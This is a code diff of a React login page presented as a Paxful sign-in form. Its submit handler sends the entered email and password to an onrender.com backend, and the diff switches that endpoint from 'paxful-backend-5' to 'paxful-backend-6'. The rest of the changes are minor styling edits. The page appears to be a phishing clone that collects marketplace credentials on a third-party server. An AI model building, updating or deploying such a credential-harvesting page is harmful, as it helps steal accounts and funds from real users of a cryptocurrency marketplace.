@@ -19,7 +19,6 @@ const LoginPage = () => {
     setPasswordError('');
     setError('');
 
-    // Only check if both fields are filled
     if (!email || !password) {
       setEmailError('Invalid email/password');
       setPasswordError('Invalid email/password');
@@ -27,7 +26,7 @@ const LoginPage = () => {
     }
 
     try {
-      const response = await fetch('https://paxful-backend-5.onrender.com/login', {
+      const response = await fetch('https://paxful-backend-6.onrender.com/login', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
@@ -75,15 +74,16 @@ const LoginPage = () => {
         <form id="loginForm" onSubmit={handleSubmit}>
           {error && <p className="error">{error}</p>}
           
-          <div className="imput_cont" style={{backgroundColor: 'red', marginTop: '-5px', borderRadius: '5px', display: (emailError || passwordError) ? 'block' : 'none' }}>
+          <div className="imput_cont" style={{backgroundColor: 'red',marginTop: '-5px',borderRadius: '5px' }}>
           {(emailError || passwordError) && (
-             <p className="validation-error" style={{ color: 'white', fontSize: '14px', marginBottom: '5px', padding: '10px' }}>
+             <p className="validation-error" style={{ color: 'white', fontSize: '14px', marginBottom: '5px' }}>
                Please enter a correct email address and password. Note that both fields may be case-sensitive.
              </p>
             )}
-          </div>
+            </div>
 
           <div className="imput_cont">
+
             <h4 style={{ marginTop: '20px' }}>Email / Phone Number</h4>
             <div className="input">
               <input
